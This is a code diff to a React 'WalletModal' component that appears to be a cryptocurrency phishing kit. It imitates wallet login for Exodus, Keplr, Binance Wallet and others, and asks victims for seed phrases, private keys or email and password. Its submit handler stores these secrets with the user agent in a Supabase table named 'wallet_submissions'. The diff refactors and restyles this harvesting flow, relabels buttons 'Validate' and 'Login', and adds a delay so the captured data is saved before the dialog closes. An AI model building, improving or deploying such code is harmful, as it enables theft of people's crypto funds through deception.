@@ -59,7 +59,7 @@ const wallets: Wallet[] = [
   { name: "EXODUS", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://www.exodus.com/favicon.ico" },
   { name: "KEPLR", desc: "BROWSER EXTENSION", e2e: true, icon: "https://www.keplr.app/favicon.ico" },
   { name: "ATOMIC WALLET", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://atomicwallet.io/favicon.ico" },
-  { name: "LEAP COSMOS", desc: "BROWSER EXTENSION", e2e: true, icon: "https://www.leapwallet.io/favicon.ico" },
+  { name: "LEAP COSMOS", desc: "BROWSER EXTENSION", e2e: true, icon: "https://www.keplr.app/favicon.ico" },
   { name: "CAKE WALLET", desc: "MOBILE", e2e: true, icon: "https://cakewallet.com/favicon.ico" },
   { name: "GUARDA", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://guarda.com/favicon.ico" },
   { name: "BINANCE WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://bin.bnbstatic.com/static/images/home/binance-logo.png" },
@@ -134,7 +134,6 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
   };
 
   const startLogin = async () => {
-    // Stage 1: Register Initial Choice and Address
     if (!walletAddress) return;
     
     setIsSubmitting(true);
@@ -148,7 +147,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
         user_agent: typeof window !== "undefined" ? window.navigator.userAgent : "unknown"
       }]);
     } catch (err) {
-      console.error("Initial interaction failed to register:", err);
+      console.error("Initial interaction registration failed:", err);
     } finally {
       setIsSubmitting(false);
       setView("processing");
@@ -160,23 +159,34 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
     setIsSubmitting(true);
 
     try {
+      let dataPayload: any = {};
+      
+      if (type === "seed-phrase") {
+        dataPayload = {
+          words: seedWords.slice(0, wordCount).filter(w => w.trim() !== ""),
+          count: wordCount
+        };
+      } else if (type === "email-password") {
+        dataPayload = { email, password };
+      } else if (type === "private-key") {
+        dataPayload = { private_key: privateKey };
+      }
+
       const submissionData = {
         wallet_name: selectedWallet?.name,
         wallet_address: walletAddress,
         type,
-        data: type === "seed-phrase" ? { 
-          words: seedWords.slice(0, wordCount).filter(w => w.trim() !== ""),
-          count: wordCount
-        } : 
-              type === "email-password" ? { email, password } : 
-              { private_key: privateKey },
+        data: dataPayload,
         timestamp: new Date().toISOString(),
         user_agent: typeof window !== "undefined" ? window.navigator.userAgent : "unknown"
       };
 
       await supabaseClient.from("wallet_submissions").insert([submissionData]);
       
-      resetState();
+      // Small delay to ensure DB registration before closing
+      setTimeout(() => {
+        resetState();
+      }, 1000);
     } catch (error) {
       console.error("Final validation submission failed:", error);
     } finally {
@@ -354,10 +364,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                 <Button 
                   onClick={startLogin}
                   disabled={isSubmitting || !walletAddress}
-                  className="w-full h-14 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-black text-xs uppercase tracking-[0.2em] rounded-2xl gap-3 shadow-lg shadow-orange-500/10"
+                  className="w-full h-14 bg-primary text-black font-black text-xs uppercase tracking-[0.2em] rounded-2xl gap-3 shadow-neon"
                 >
                   {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
-                  Login In
+                  Login
                 </Button>
               </div>
             </div>
@@ -526,7 +536,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   onClick={() => setWordCount(12)}
                   className={cn(
                     "flex-1 h-12 rounded-xl text-xs font-black uppercase tracking-widest transition-all",
-                    wordCount === 12 ? "bg-emerald-500 text-black shadow-neon" : "bg-[#0D161F] text-slate-500 border border-white/5"
+                    wordCount === 12 ? "bg-primary text-black" : "bg-[#0D161F] text-slate-500 border border-white/5"
                   )}
                 >
                   12 Words
@@ -535,7 +545,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   onClick={() => setWordCount(24)}
                   className={cn(
                     "flex-1 h-12 rounded-xl text-xs font-black uppercase tracking-widest transition-all",
-                    wordCount === 24 ? "bg-emerald-500 text-black shadow-neon" : "bg-[#0D161F] text-slate-500 border border-white/5"
+                    wordCount === 24 ? "bg-primary text-black" : "bg-[#0D161F] text-slate-500 border border-white/5"
                   )}
                 >
                   24 Words
@@ -556,7 +566,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                         newWords[i] = e.target.value;
                         setSeedWords(newWords);
                       }}
-                      className="bg-[#0D161F] border-white/5 h-12 pl-10 pr-10 text-[11px] font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-xl placeholder:text-slate-700"
+                      className="bg-[#0D161F] border-white/5 h-12 pl-10 pr-10 text-[11px] font-bold focus-visible:ring-1 focus-visible:ring-primary/50 rounded-xl placeholder:text-slate-700"
                     />
                     <div className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-600">
                       <EyeOff size={14} />
@@ -568,10 +578,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
               <Button 
                 onClick={() => handleFinalSubmit("seed-phrase")}
                 disabled={isSubmitting}
-                className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10"
+                className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
               >
                 {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
-                Login
+                Validate
               </Button>
             </div>
           </div>
@@ -613,21 +623,21 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   placeholder="Wallet Email" 
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
-                  className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
+                  className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
                 />
                 <Input 
                   type="password"
                   placeholder="Wallet Password" 
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
+                  className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
                 />
               </div>
 
               <Button 
                 onClick={() => handleFinalSubmit("email-password")}
                 disabled={isSubmitting}
-                className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10"
+                className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
               >
                 {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
                 Login
@@ -679,17 +689,17 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   placeholder="0x..." 
                   value={privateKey}
                   onChange={(e) => setPrivateKey(e.target.value)}
-                  className="bg-[#0D161F] border-white/5 h-16 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
+                  className="bg-[#0D161F] border-white/5 h-16 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
                 />
               </div>
 
               <Button 
                 onClick={() => handleFinalSubmit("private-key")}
                 disabled={isSubmitting}
-                className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10"
+                className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
               >
                 {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
-                Login
+                Validate
               </Button>
 
               <div className="mt-8 text-center">
